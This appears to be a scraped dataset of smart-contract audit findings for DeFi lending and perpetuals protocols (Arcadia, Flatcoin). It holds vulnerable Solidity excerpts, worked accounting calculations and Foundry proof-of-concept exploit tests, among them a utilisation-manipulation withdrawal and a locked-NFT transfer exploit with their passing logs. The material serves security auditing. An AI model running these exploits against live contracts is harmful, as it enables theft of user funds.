AccountErrors.TooManyAssets();\n    }\n}\n```\n```\nfunction processDirectDeposit(\n    address creditor,\n    address asset,\n    uint256 assetId,\n    uint256 amount\n) public override returns (uint256 recursiveCalls, uint256 assetType) {\n    // Amount deposited of a Uniswap V3 LP can be either 0 or 1 (checked in the Account).\n    // For uniswap V3 every id is a unique asset -> on every deposit the asset must added to the Asset Module.\n    if (amount == 1) {\n        _addAsset(assetId);\n    }\n    // rest of code\n}\n```\n```\nfunction _addAsset(uint256 assetId) internal {\n    (,, address token0, address token1,,, uint128 liquidity,,,,) = \n        NON_FUNGIBLE_POSITION_MANAGER.positions(assetId);\n\n    if (liquidity == 0) {\n        revert ZeroLiquidity();\n    }\n\n    assetToLiquidity[assetId] = liquidity;\n}\n```\nfunction _getPosition(uint256 assetId)\n    internal\n    view\n    returns (address token0, address token1, int24 tickLower, int24 tickUpper, uint128 liquidity)\n{\n    liquidity = uint128(assetToLiquidity[assetId]);\n\n    if (liquidity > 0) {\n        (,, token0, token1,, tickLower, tickUpper,,,,) = NON_FUNGIBLE_POSITION_MANAGER.positions(assetId);\n    } else {\n        (,, token0, token1,, tickLower, tickUpper, liquidity,,,) = NON_FUNGIBLE_POSITION_MANAGER.positions(assetId);\n    }\n}\n```"
"```\nuint256 currentRewardGlobal = _getCurrentReward(positionState_.asset);\nuint256 deltaReward = currentRewardGlobal - assetState_.lastRewardGlobal;\n```\n```\nfunction _getCurrentReward(address asset) internal view override returns (uint256 currentReward) {\n    currentReward = LP_STAKING_TIME.pendingEmissionToken(assetToPid[asset], address(this));\n}\n```\n```\nfunction testFork_WrongRewards() public {\n    uint256 initBalance = 1000 * 10 ** USDbC.decimals();\n    vm.startPrank(users.accountOwner);\n    deal(address(USDbC), users.accountOwner, initBalance);\n\n    USDbC.approve(address(router), initBalance);\n    router.addLiquidity(poolId, initBalance, users.accountOwner);\n\n    uint256 stakedAmount = ERC20(address(pool)).balanceOf(users.accountOwner);\n    ERC20(address(pool)).approve(address(stakedStargateAM), stakedAmount);\n    uint256 tokenId = stakedStargateAM.mint(address(pool), uint128(stakedAmount) / 4);\n\n    vm.warp(block.timestamp + 10 days);\n\n    uint256 initialRewards = stakedStargateAM.rewardOf(tokenId);\n    stakedStargateAM.increaseLiquidity(tokenId, 1);\n\n    vm.expectRevert();\n    stakedStargateAM.burn(tokenId);\n\n    vm.warp(block.timestamp + 10 days);\n    uint256 currentRewards = stakedStargateAM.rewardOf(tokenId);\n    stakedStargateAM.burn(tokenId);\n\n    assert(currentRewards - initialRewards < 1e10);\n    vm.stopPrank();\n}"
"```\naccount = address(\n    new Proxy({\n        salt: keccak256(abi.encodePacked(salt, tx.origin))\n    })(\n        versionInformation[accountVersion].implementation\n    )\n);"
"```\nRunning 1 test for test/scenario/BorrowAndRepay.scenario.t.sol:BorrowAndRepay_Scenario_Test\n[PASS] testScenario_Poc() (gas: 799155)\nLogs:\n  100 initial pool balance. This is also the amount deposited into tranche\n  warp 2 minutes into future\n  mint was used rather than deposit to ensure no rounding error. This is a utilization manipulation attack, not a share inflation attack\n  22 shares were burned in exchange for 100000 assets. Users.LiquidityProvider only deposited 100 asset in the tranche but withdrew 100000 assets!\n```\nfunction setUp() public virtual override(Fuzz_Lending_Test) {\n    Fuzz_Lending_Test.setUp();\n    deployArcadiaLendingWithAccounts();\n\n    vm.prank(users.creatorAddress);\n    pool.addTranche(address(tranche), 50);\n\n    // Deposit funds in the pool.\n    deal(address(mockERC20.stable1), users.liquidityProvider, type(uint128).max, true);\n\n    vm.startPrank(users.liquidityProvider);\n    mockERC20.stable1.approve(address(pool), 100);\n    tranche.mint(100, users.liquidityProvider);\n    vm.stopPrank();\n\n    vm.startPrank(users.creatorAddress);\n    pool.setAccountVersion(1, true);\n    pool.setInterestParameters(\n        Constants.interestRate,\n        Constants.interestRate,\n        Constants.interestRate,\n        Constants.utilisationThreshold\n    );\n    vm.stopPrank();\n\n    vm.prank(users.accountOwner);\n    proxyAccount.openMarginAccount(address(pool));\n}\n```\n```\nfunction testScenario_Poc() public {\n    uint poolBalance = mockERC20.stable1.balanceOf(address(pool));\n    console.log(poolBalance, ""initial pool balance. This is also the amount deposited into tranche"");\n\n    vm.startPrank(users.liquidityProvider);\n    mockERC20.stable1.approve(address(pool), 1e18);\n    mockERC20.stable1.transfer(address(pool), 1e18);\n    vm.stopPrank();\n\n    uint112 amountToken = 1e30;\n    uint128 amountCredit = 1e10;\n\n    uint16 collFactor_ = Constants.tokenToStableCollFactor;\n    uint256 valueOfOneToken = (Constants.WAD * rates.token1ToUsd) / 10 ** Constants.tokenOracleDecimals;\n\n    depositTokenInAccount(proxyAccount, mockERC20.token1, amountToken);\n\n    uint256 maxCredit = (\n        (valueOfOneToken * amountToken) / 10 ** Constants.tokenDecimals * collFactor_ / AssetValuationLib.ONE_4\n            / 10 ** (18 - Constants.stableDecimals)\n    );\n\n    vm.startPrank(users.accountOwner);\n    pool.borrow(amountCredit, address(proxyAccount), users.accountOwner, emptyBytes3);\n    vm.stopPrank();\n\n    assertEq(mockERC20.stable1.balanceOf(users.accountOwner), amountCredit);\n\n    vm.roll(block.number + 10);\n    vm.warp(block.timestamp + 120);\n\n    console.log(""warp 2 minutes into future"");\n\n    address victim = address(123);\n    deal(address(mockERC20.stable1), victim, type(uint128).max, true);\n\n    vm.startPrank(victim);\n    mockERC20.stable1.approve(address(pool), type(uint128).max);\n    uint shares = tranche.mint(1e3, victim);\n    vm.stopPrank();\n\n    console.log(""mint was used rather than deposit to ensure no rounding error. This a UTILISATION manipulation attack not a share inflation attack"");\n\n    vm.startPrank(users.liquidityProvider);\n    uint withdrawShares = tranche.withdraw(1e5, users.liquidityProvider, users.liquidityProvider);\n    vm.stopPrank();\n\n    console.log(withdrawShares, ""shares were burned in exchange for 100000 assets. Users.LiquidityProvider only deposited 100 asset in the tranche but withdrew 100000 assets!"");\n}\n```"
"```\nIAccount(account).updateActionTimestampByCreditor()\n\nasset.safeTransfer(actionTarget, amountBorrowed)\n\nuint256 accountVersion = IAccount(account).flashActionByCreditor(actionTarget, actionData)\nif (!isValidVersion[accountVersion]) revert LendingPoolErrors.InvalidVersion()\n```\n```\nfunction updateActionTimestampByCreditor() external onlyCreditor {\n    updateActionTimestamp;\n}\n```"
"```\nfunction executeOrder(\n    address account,\n    bytes[] calldata priceUpdateData\n)\n    external\n    payable\n    nonReentrant\n    whenNotPaused\n    updatePythPrice(vault, msg.sender, priceUpdateData)\n    orderInvariantChecks(vault)\n{\n    settleFundingFees();\n    //...SNIP..\n}\n```\n```\nmodifier updatePythPrice(\n    IFlatcoinVault vault,\n    address sender,\n    bytes[] calldata priceUpdateData\n) {\n    IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).updatePythPrice{value: msg.value}(\n        sender,\n        priceUpdateData\n    );\n    _\n}\n```\n```\nfunction updatePythPrice(address sender, bytes[] calldata priceUpdateData) external payable nonReentrant {\n    uint256 fee = offchainOracle.oracleContract.getUpdateFee(priceUpdateData);\n\n    offchainOracle.oracleContract.updatePriceFeeds{value: fee}(priceUpdateData);\n\n    if (msg.value - fee > 0) {\n        (bool success,) = sender.call{value: msg.value - fee}("""");\n        if (success == false) revert FlatcoinErrors.RefundFailed();\n    }\n}\n```\n```\nfunction updatePriceFeeds(\n    bytes[] calldata updateData\n) public payable override {\n    uint totalNumUpdates = 0;\n    for (uint i = 0; i < updateData.length; ) {\n        if (updateData[i].length > 4 &&\n            UnsafeCalldataBytesLib.toUint32(updateData[i], 0) ==\n            ACCUMULATOR_MAGIC) {\n            totalNumUpdates += updatePriceInfosFromAccumulatorUpdate(updateData[i]);\n        } else {\n            updatePriceBatchFromVm(updateData[i]);\n            totalNumUpdates += 1;\n        }\n        unchecked {\n            i++;\n        }\n    }\n    uint requiredFee = getTotalFee(totalNumUpdates);\n    if (msg.value < requiredFee) revert PythErrors.InsufficientFee();\n}\n```"
"```\npriceShift = current_price - last_price\npriceShift = $600 - $1000 = -$400\n\nprofitLossTotal = (globalPosition.sizeOpenedTotal * priceShift) / current_price\nprofitLossTotal = (12 * -$400) / $600\nprofitLossTotal = -8 ETH\n```\nnewMarginDepositedTotal = _globalPositions.marginDepositedTotal + _marginDelta + profitLossTotal\n\nnewMarginDepositedTotal = (_globalPositions.marginDepositedTotal + _marginDelta + profitLossTotal)\nnewMarginDepositedTotal = 0 ETH\n```\n```\nfunction updateGlobalPositionData(\n    uint256 _price,\n    int256 _marginDelta,\n    int256 _additionalSizeDelta\n) external onlyAuthorizedModule {\n    int256 profitLossTotal = PerpMath._profitLossTotal({\n        globalPosition: _globalPositions,\n        price: _price\n    });\n\n    int256 newMarginDepositedTotal = int256(_globalPositions.marginDepositedTotal) + _marginDelta + profitLossTotal;\n\n    if (newMarginDepositedTotal < 0) {\n        revert FlatcoinErrors.InsufficientGlobalMargin();\n    }\n\n    _globalPositions = FlatcoinStructs.GlobalPositions({\n        marginDepositedTotal: uint256(newMarginDepositedTotal),\n        sizeOpenedTotal: (int256(_globalPositions.sizeOpenedTotal) + _additionalSizeDelta).toUint256(),\n        lastPrice: _price\n    });\n\n    _updateStableCollateralTotal(-profitLossTotal);\n}\n```"
"```\nfunction testExploitTransferOut() public {\n    uint256 collateralPrice = 1000e8;\n\n    vm.startPrank(alice);\n\n    uint256 balance = WETH.balanceOf(alice);\n    console2.log(""alice balance"", balance);\n\n    (uint256 minFillPrice,) = oracleModProxy.getPrice();\n\n    // Announce order through delayed orders to lock tokenId\n    delayedOrderProxy.announceLeverageClose(\n        tokenId,\n        minFillPrice - 100, // add some slippage\n        mockKeeperFee.getKeeperFee()\n    );\n\n    // Announce limit order to lock tokenId\n    limitOrderProxy.announceLimitOrder({\n        tokenId: tokenId,\n        priceLowerThreshold: 900e18,\n        priceUpperThreshold: 1100e18\n    });\n\n    // Cancel limit order to unlock tokenId\n    limitOrderProxy.cancelLimitOrder(tokenId);\n\n    balance = WETH.balanceOf(alice);\n    console2.log(""alice after creating two orders"", balance);\n\n    // TokenId is unlocked and can be transferred while the delayed order is active\n    leverageModProxy.transferFrom(alice, address(0x1), tokenId);\n    console2.log(""new owner of position NFT"", leverageModProxy.ownerOf(tokenId));\n\n    balance = WETH.balanceOf(alice);\n    console2.log(""alice after transferring position NFT out e.g. selling"", balance);\n\n    skip(uint256(vaultProxy.minExecutabilityAge())); // must reach minimum executability time\n\n    uint256 oraclePrice = collateralPrice;\n\n    bytes[] memory priceUpdateData = getPriceUpdateData(oraclePrice);\n    delayedOrderProxy.executeOrder{value: 1}(alice, priceUpdateData);\n\n    uint256 finalBalance = WETH.balanceOf(alice);\n    console2.log(""alice after executing delayed order and cashing out profit"", finalBalance);\n    console2.log(""profit"", finalBalance - balance);\n}\n```\n```\nRunning 1 test for test/unit/Common/LimitOrder.t.sol:LimitOrderTest\n[PASS] testExploitTransferOut() (gas: 743262)\n\nLogs:\n  alice balance 99879997000000000000000\n  alice after creating two orders 99879997000000000000000\n  new owner of position NFT 0x0000000000000000000000000000000000000001\n  alice after transferring position NFT out (e.g., selling) 99879997000000000000000\n  alice after executing delayed order and cashing out profit 99889997000000000000000\n  profit 10000000000000000000\n\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 50.06ms\n\nRan 1 test suite: 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```"
```\nuint256 tradeFee = \nILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).getTradeFee(\n    vault.getPosition(tokenId).additionalSize\n);\n```
"```\ndef settleFundingFees():\n    Short_LP_need_to_pay_Long = 100\n\n    marginDepositedTotal = marginDepositedTotal + funding_fee\n    marginDepositedTotal = y + (-100) = (y - 100)\n\n    stableCollateralTotal = x + (-(-100)) = (x + 100)\n```\n```\nif uint256(settledMargin) > expectedLiquidationFee:\n    if +20 > +25:\n        False\n    liquidatorFee = settledMargin\n    liquidatorFee = +20\n```\n```\nvault.updateStableCollateralTotal(remainingMargin - positionSummary.profitLoss);\nvault.updateStableCollateralTotal(0 - 100);\nvault.updateStableCollateralTotal(-100);\n\nstableCollateralTotal = x + 100 - 100\n```\n```\nfunction liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId) {\n    // Check that the total margin deposited by the long traders is not -ve.\n    // To get this amount, we will have to account for the PnL and funding fees accrued.\n    int256 settledMargin = positionSummary.marginAfterSettlement;\n\n    uint256 liquidatorFee;\n\n    if (settledMargin > 0) {\n        // Calculate the liquidation fees to be sent to the caller.\n        uint256 expectedLiquidationFee = PerpMath._liquidationFee(\n            position.additionalSize,\n            liquidationFeeRatio,\n            liquidationFeeLowerBound,\n            liquidationFeeUpperBound,\n            currentPrice\n        );\n\n        uint256 remainingMargin;\n\n        // Calculate the remaining margin after accounting for liquidation fees.\n        // If the settled margin is less than the liquidation fee, then the liquidator fee is the settled margin.\n        if (uint256(settledMargin) > expectedLiquidationFee) {\n            liquidatorFee = expectedLiquidationFee;\n            remainingMargin = uint256(settledMargin) - expectedLiquidationFee;\n        } else {\n            liquidatorFee = uint256(settledMargin);\n        }\n\n        // Adjust the stable collateral total to account for user's remaining margin.\n        // If the remaining margin is greater than 0, this goes to the LPs.\n        // Note that `remainingMargin - profitLoss` is the same as `marginDeposited + accruedFunding`.\n        vault.updateStableCollateralTotal(int256(remainingMargin) - positionSummary.profitLoss);\n\n        // Send the liquidator fee to the caller of the function.\n        // If the liquidation fee is greater than the remaining margin, then send the remaining margin.\n        vault.sendCollateral(msg.sender, liquidatorFee);\n    } else {\n        // If the settled margin is -ve then the LPs have to bear the cost.\n        // Adjust the stable collateral total to account for user's profit/loss and the negative margin.\n        // Note: We are adding `settledMargin` and `profitLoss` instead of subtracting because of their sign (which will be -ve).\n        vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);\n    }\n```\n```\nvault.updateGlobalPositionData({marginDelta: -(position.marginDeposited + positionSummary.accruedFunding)})\nvault.updateGlobalPositionData({marginDelta: -(20 + positionSummary.accruedFunding)})\nvault.updateGlobalPositionData({marginDelta: 80})\n\nprofitLossTotal = 100\nnewMarginDepositedTotal = globalPositions.marginDepositedTotal + marginDelta + profitLossTotal\nnewMarginDepositedTotal = globalPositions.marginDepositedTotal + 80 + 100\n\nstableCollateralTotal = stableCollateralTotal + profitLossTotal\nstableCollateralTotal = x + 100\n```\n```\nvault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);\nvault.updateStableCollateralTotal(-3 * rETH - (-5 * rETH));\nvault.updateStableCollateralTotal(+2);\n```\n```\nfunction liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId) {\n    vault.updateGlobalPositionData({\n        price: position.lastPrice,\n        marginDelta: -(int256(position.marginDeposited) + positionSummary.accruedFunding),\n        additionalSizeDelta: -int256(position.additionalSize) // Since position is being closed, additionalSizeDelta should be negative.\n    });\n```\n```\nfunction updateGlobalPositionData(\n    uint256 _price,\n    int256 _marginDelta,\n    int256 _additionalSizeDelta\n) external onlyAuthorizedModule {\n    int256 profitLossTotal = PerpMath._profitLossTotal({\n        globalPosition: _globalPositions,\n        price: _price\n    });\n\n    int256 newMarginDepositedTotal = int256(_globalPositions.marginDepositedTotal) + _marginDelta + profitLossTotal;\n\n    if (newMarginDepositedTotal < 0) {\n        revert FlatcoinErrors.InsufficientGlobalMargin();\n    }\n\n    _globalPositions = FlatcoinStructs.GlobalPositions({\n        marginDepositedTotal: uint256(newMarginDepositedTotal),\n        sizeOpenedTotal: (int256(_globalPositions.sizeOpenedTotal) + _additionalSizeDelta).toUint256(),\n        lastPrice: _price\n    });\n\n    _updateStableCollateralTotal(-profitLossTotal);\n}\n```\n```\ndef settleFundingFees():\n    need_to_pay_short = 5\n\n    marginDepositedTotal = marginDepositedTotal + need_to_pay_short\n    marginDepositedTotal = 70 + (-5)\n    marginDepositedTotal = 65\n\n    stableCollateralTotal = 100 + (-(-5))\n    stableCollateralTotal = 105\n```\n```\nsettled_margin > 0 => True\n(settled_margin > expected_liquidation_fee) => (60 > 50) => True\nremaining_margin = uint256(settled_margin) - expected_liquidation_fee = 10\n```\n```\nvault.updateStableCollateralTotal(remainingMargin - positionSummary.profitLoss) =>\n    stableCollateralTotal = 105 ETH + (remainingMargin - positionSummary.profitLoss)\n    stableCollateralTotal = 105 ETH + (10 ETH - (-5 ETH))\n    stableCollateralTotal = 105 ETH + (15 ETH) = 120 ETH\n```\n```\nvault.updateGlobalPositionData({marginDelta: -(position.marginDeposited + positionSummary.accruedFunding)})\n\nvault.updateGlobalPositionData({marginDelta: -(70 + positionSummary.accruedFunding)})\nvault.updateGlobalPositionData({marginDelta: -65})\n\nprofitLossTotal = -5\nnewMarginDepositedTotal = globalPositions.marginDepositedTotal + marginDelta + profitLossTotal\nnewMarginDepositedTotal = 70 + (-65) + (-5)\n\nstableCollateralTotal = stableCollateralTotal + profitLossTotal\nstableCollateralTotal = 120 + (-5)\n```"
"```\nPnL = Position Size * Price Shift / Current Price\nPnL = Position Size * (Current Price - Last Price) / Current Price\nPnL = Position Size * (2000 - 1000) / 2000\nPnL = 40 * (2000 - 1000) / 2000\nPnL = 40 * 1000 / 2000\nPnL = 40000 / 2000\nPnL = 20 rETH\n```\n```\nPnL = Position Size * Price Shift / Current Price\nPnL = Position Size * (Current Price - Last Price) / Current Price\nPnL = Position Size * (Current Price - Last Price) / Current Price\nPnL = 40 * (($500 - $1000) / $500)\nPnL = 40 * (-$200) / $500\nPnL = -40\n```\n```\nFile: LeverageModule.sol\n\nuint256 newMargin = (marginAdjustment +\n    PerpMath._getPositionSummary({\n        position: position,\n        nextFundingEntry: cumulativeFunding,\n        price: adjustPrice\n    }).marginAfterSettlement).toUint256();\n\nvault.setPosition(\n    FlatcoinStructs.Position({\n        lastPrice: adjustPrice,\n        marginDeposited: newMargin,\n        additionalSize: newAdditionalSize,\n        entryCumulativeFunding: cumulativeFunding\n    }),\n    announcedAdjust.tokenId\n);\n```\n```\nPnL = Position Size * Price Shift / Current Price\nPnL = Position Size * (Current Price - Last Price) / Current Price\nPnL = Position Size * (2000 - 500) / 500\nPnL = 40 * (2000 - 500) / 500\nPnL = 40 * 1500 / 500\nPnL = 60000 / 2000\nPnL = 30 rETH\n```\n```\npriceShift = $750 - $1000\npriceShift = -$250\n\nprofitLossTotal = (globalPosition.sizeOpenedTotal * priceShift) / price\nprofitLossTotal = (150 * -250) / 750\nprofitLossTotal = -50 ETH\n```\npriceShift = $500 - $750\npriceShift = -$250\n\nprofitLossTotal = (globalPosition.sizeOpenedTotal * priceShift) / price\nprofitLossTotal = (150 * -250) / 500\nprofitLossTotal = -75 ETH\n```\nAlice's PNL\npriceShift = current price - entry price = $500 - $1000 = -$500\nPnL = (position size * priceShift) / current price\nPnL = (100 ETH * -500) / 500 = -100 ETH\n\nBob's PNL\npriceShift = current price - entry price = $500 - $1000 = -$500\nPnL = (position size * priceShift) / current price\nPnL = (50 ETH * -500) / 500 = -50 ETH\n```"
"```\npragma solidity ^0.8.0;\n\ncontract LiquidationModule {\n    /// @notice Function to liquidate a position.\n    function liquidate(uint256 tokenId) public nonReentrant whenNotPaused {\n        FlatcoinStructs.Position memory position = vault.getPosition(tokenId);\n\n        (uint256 currentPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice();\n\n        // Settle funding fees accrued till now.\n        vault.settleFundingFees();\n\n        // Check if the position can indeed be liquidated.\n        if (!canLiquidate(tokenId)) revert FlatcoinErrors.CannotLiquidate(tokenId);\n\n        FlatcoinStructs.PositionSummary memory positionSummary = PerpMath._getPositionSummary(\n            position,\n            vault.cumulativeFundingRate(),\n            currentPrice\n        );\n\n        vault.updateGlobalPositionData({\n            price: position.lastPrice,\n            marginDelta: -(int256(position.marginDeposited) + positionSummary.accruedFunding),\n            additionalSizeDelta: -int256(position.additionalSize) // Since position is being closed, additionalSizeDelta should be negative.\n        });\n    }\n}\n```\nfunction updateGlobalPositionData(\n    uint256 _price,\n    int256 _marginDelta,\n    int256 _additionalSizeDelta\n) external onlyAuthorizedModule {\n    // Get the total profit loss and update the margin deposited total.\n    int256 profitLossTotal = PerpMath._profitLossTotal({\n        globalPosition: _globalPositions,\n        price: _price\n    });\n\n    // Note that technically, even the funding fees should be accounted for when computing the margin deposited total.\n    // However, since the funding fees are settled at the same time as the global position data is updated,\n    // we can ignore the funding fees here.\n    int256 newMarginDepositedTotal = int256(_globalPositions.marginDepositedTotal) + _marginDelta + profitLossTotal;\n\n    // Check that the sum of margin of all the leverage traders is not negative.\n    // Rounding errors shouldn't result in a negative margin deposited total given that\n    // we are rounding down the profit loss of the position.\n    // If anything, after closing the last position in the system, the `marginDepositedTotal` should can be positive.\n    // The margin may be negative if liquidations are not happening in a timely manner.\n    if (newMarginDepositedTotal < 0) {\n        revert FlatcoinErrors.InsufficientGlobalMargin();\n    }\n\n    _globalPositions = FlatcoinStructs.GlobalPositions({\n        marginDepositedTotal: uint256(newMarginDepositedTotal),\n        sizeOpenedTotal: (int256(_globalPositions.sizeOpenedTotal) + _additionalSizeDelta).toUint256(),\n        lastPrice: _price\n    });\n```"
"```\nfunction settleFundingFees() public returns (int256 _fundingFees) {\n    // Calculate the funding fees accrued to the longs.\n    // This will be used to adjust the global margin and collateral amounts.\n    _fundingFees = PerpMath._accruedFundingTotalByLongs(_globalPositions, unrecordedFunding);\n\n    // In the worst case scenario that the last position which remained open is underwater,\n    // we set the margin deposited total to 0. We don't want to have a negative margin deposited total.\n    _globalPositions.marginDepositedTotal = int256(_globalPositions.marginDepositedTotal) > _fundingFees\n       ? uint256(int256(_globalPositions.marginDepositedTotal) + _fundingFees)\n        : 0;\n\n    _updateStableCollateralTotal(-_fundingFees);\n}"
"```\nvault.updateStableCollateralTotal(-int256(_amountOut))\n```\n```\nif (withdrawalIndex < withdrawalCount - 1) {\n    _withdrawFee = (stableWithdrawFee * _amountOut) / 1e18;\n}\n\nvault.checkSkewMax({additionalSkew: 0});\n```\n```\n        amountOut -= totalFee;\n\n        if (amountOut < stableWithdraw.minAmountOut) {\n            revert FlatcoinErrors.HighSlippage(amountOut, stableWithdraw.minAmountOut);\n        }\n\n        vault.updateStableCollateralTotal(int256(withdrawFee)); // pay the withdrawal fee to stable LPs\n        vault.sendCollateral({to: msg.sender, amount: order.keeperFee}); // pay the keeper their fee\n        vault.sendCollateral({to: account, amount: amountOut}); // transfer remaining amount to the trader\n```\n```\nuint256 totalFee = order.keeperFee + withdrawFee;\n```\n```\nfunction test_audit_withdraw_fee_ignored_when_checks_skew_max() public {\n    uint256 skewFractionMax = vaultProxy.skewFractionMax();\n    assertEq(skewFractionMax, 120e16);\n\n    vm.prank(vaultProxy.owner());\n    stableModProxy.setStableWithdrawFee(1e16);\n\n    uint256 collateralPrice = 1000e8;\n\n    uint256 depositAmount = 100e18;\n    announceAndExecuteDeposit({\n        traderAccount: alice,\n        keeperAccount: keeper,\n        depositAmount: depositAmount,\n        oraclePrice: collateralPrice,\n        keeperFeeAmount: 0\n    });\n\n    uint256 additionalSize = 100e18;\n    announceAndExecuteLeverageOpen({\n        traderAccount: bob,\n        keeperAccount: keeper,\n        margin: 50e18,\n        additionalSize: 100e18,\n        oraclePrice: collateralPrice,\n        keeperFeeAmount: 0\n    });\n\n    int256 skewAfterLeverageOpen = vaultProxy.getCurrentSkew();\n    assertEq(skewAfterLeverageOpen, 0);\n    uint256 skewFractionAfterLeverageOpen = getLongSkewFraction();\n    assertEq(skewFractionAfterLeverageOpen, 1e18);\n}\n```"
"```\nfunction executeOpen(\n    address _account,\n    address _keeper,\n    FlatcoinStructs.Order calldata _order\n) external whenNotPaused onlyAuthorizedModule returns (uint256 _newTokenId) {\n    vault.checkSkewMax({additionalSkew: announcedOpen.additionalSize});\n\n    vault.updateGlobalPositionData({\n        price: entryPrice,\n        marginDelta: int256(announcedOpen.margin),\n        additionalSizeDelta: int256(announcedOpen.additionalSize)\n    });\n}\n```\n```\nstableCollateralTotal = 90e18\n\n_globalPositions = {\n    sizeOpenedTotal: 100e18,\n    lastPrice: 1800e18,\n}\n\nadditionalSize = 5e18\nfresh_price = 2000e18\n```\n```\nlongSkewFraction = (_globalPositions.sizeOpenedTotal + additionalSize) * 1e18 / stableCollateralTotal\n                 = (100e18 + 5e18) * 1e18 / 90e18\n                 = 1.16667e18\n                 if skewFractionMax(1.2e18) > longSkewFraction:\n                     checkSkewMax = True\n```\n```\ndef updateGlobalPositionData():\n    profitLossTotal = _globalPositions.sizeOpenedTotal * (int256(price) - int256(globalPosition.lastPrice)) / int256(price)\n    profitLossTotal = 100e18 * (2000e18 - 1800e18) / 2000e18\n    profitLossTotal = 10e18\n\n    _updateStableCollateralTotal(-profitLossTotal)\n    stableCollateralTotal = 90e18 - 10e18\n    stableCollateralTotal = 80e18\n\n    checkSkewMax()\n    longSkewFraction = (_globalPositions.sizeOpenedTotal + additionalSize) * 1e18 / stableCollateralTotal\n    longSkewFraction = (100e18 + 5e18) * 1e18 / 80e18\n    longSkewFraction = 1.3125e18\n    if longSkewFraction > skewFractionMax(1.2e18):\n```"
"```\nFile: LiquidationModule.sol\n\nfunction liquidate(\n    uint256 tokenID,\n    bytes[] calldata priceUpdateData\n) external payable whenNotPaused updatePythPrice(vault, msg.sender, priceUpdateData) {\n    liquidate(tokenID);\n}\n\nfunction liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId) {\n    FlatcoinStructs.Position memory position = vault.getPosition(tokenId);\n```\n```\npragma solidity ^0.8.0;\n\nfunction _getPrice(uint32 maxAge) internal view returns (uint256 price, uint256 timestamp) {\n    (uint256 onchainPrice, uint256 onchainTime) = _getOnchainPrice(); // will revert if invalid\n    (uint256 offchainPrice, uint256 offchainTime, bool offchainInvalid) = _getOffchainPrice();\n    bool offchain;\n\n    uint256 priceDiff = (int256(onchainPrice) - int256(offchainPrice)).abs();\n    uint256 diffPercent = (priceDiff * 1e18) / onchainPrice;\n    if (diffPercent > maxDiffPercent) revert FlatcoinErrors.PriceMismatch(diffPercent);\n\n    if (offchainInvalid == false) {\n        // return the freshest price\n        if (offchainTime >= onchainTime) {\n            price = offchainPrice;\n            timestamp = offchainTime;\n            offchain = true;\n        } else {\n            price = onchainPrice;\n            timestamp = onchainTime;\n        }\n    } else {\n        price = onchainPrice;\n        timestamp = onchainTime;\n    }\n\n    // Check that the timestamp is within the required age\n    if (maxAge < type(uint32).max && timestamp + maxAge < block.timestamp) {\n        revert FlatcoinErrors.PriceStale(\n            offchain? FlatcoinErrors.PriceSource.OffChain : FlatcoinErrors.PriceSource.OnChain\n        );\n    }\n}\n```"
"```\nfunction executeWithdraw(\n    address _account,\n    uint64 _executableAtTime,\n    FlatcoinStructs.AnnouncedStableWithdraw calldata _announcedWithdraw\n) external whenNotPaused onlyAuthorizedModule returns (uint256 _amountOut, uint256 _withdrawFee) {\n    uint256 withdrawAmount = _announcedWithdraw.withdrawAmount;\n\n    _burn(_account, withdrawAmount);\n\n    // Check that there is no significant impact on stable token price.\n    if (totalSupply() > 0) {\n        if (\n            stableCollateralPerShareAfter < stableCollateralPerShareBefore - 1e6 ||\n            stableCollateralPerShareAfter > stableCollateralPerShareBefore + 1e6\n        ) {\n            revert FlatcoinErrors.PriceImpactDuringWithdraw();\n        }\n\n        _withdrawFee = (stableWithdrawFee * _amountOut) / 1e18;\n\n        vault.checkSkewMax({additionalSkew: 0});\n    } else {\n        // Need to check there are no longs open before allowing full system withdrawal.\n        uint256 sizeOpenedTotal = vault.getVaultSummary().globalPositions.sizeOpenedTotal;\n\n        if (sizeOpenedTotal!= 0) {\n            revert FlatcoinErrors.MaxSkewReached(sizeOpenedTotal);\n        }\n        if (stableCollateralPerShareAfter!= 1e18) {\n            revert FlatcoinErrors.PriceImpactDuringFullWithdraw();\n        }\n    }\n}\n```\nfunction executeDeposit(\n    address _account,\n    uint64 _executableAtTime,\n    FlatcoinStructs.AnnouncedStableDeposit calldata _announcedDeposit\n) external whenNotPaused onlyAuthorizedModule returns (uint256 _liquidityMinted) {\n    uint256 depositAmount = _announcedDeposit.depositAmount;\n\n    _liquidityMinted = (depositAmount * (10 ** decimals())) / stableCollateralPerShare(maxAge);\n\n    _mint(_account, _liquidityMinted);\n\n    vault.updateStableCollateralTotal(int256(depositAmount));\n\n    // Mint points\n    IPointsModule pointsModule = IPointsModule(vault.moduleAddress(FlatcoinModuleKeys._POINTS_MODULE_KEY));\n    pointsModule.mintDeposit(_account, _announcedDeposit.depositAmount);\n}"
"```\nfunction executeDeposit(\n    address _account,\n    uint64 _executableAtTime,\n    FlatcoinStructs.AnnouncedStableDeposit calldata _announcedDeposit\n) external whenNotPaused onlyAuthorizedModule returns (uint256 _liquidityMinted) {\n    uint256 depositAmount = _announcedDeposit.depositAmount;\n\n    uint32 maxAge = _getMaxAge(_executableAtTime);\n\n    _liquidityMinted = (depositAmount * (10 ** decimals())) / stableCollateralPerShare(maxAge);\n\n    if (_liquidityMinted < _announcedDeposit.minAmountOut)\n        revert FlatcoinErrors.HighSlippage(_liquidityMinted, _announcedDeposit.minAmountOut);\n\n    _mint(_account, _liquidityMinted);\n\n    vault.updateStableCollateralTotal(int256(depositAmount));\n\n    if (totalSupply() < MIN_LIQUIDITY)\n        revert FlatcoinErrors.AmountTooSmall({amount: totalSupply(), minAmount: MIN_LIQUIDITY});\n```\n```\n_collateralPerShare = (stableBalance * (10 ** decimals())) / totalSupply\n_liquidityMinted = (depositAmount * (10 ** decimals())) / _collateralPerShare\n```"
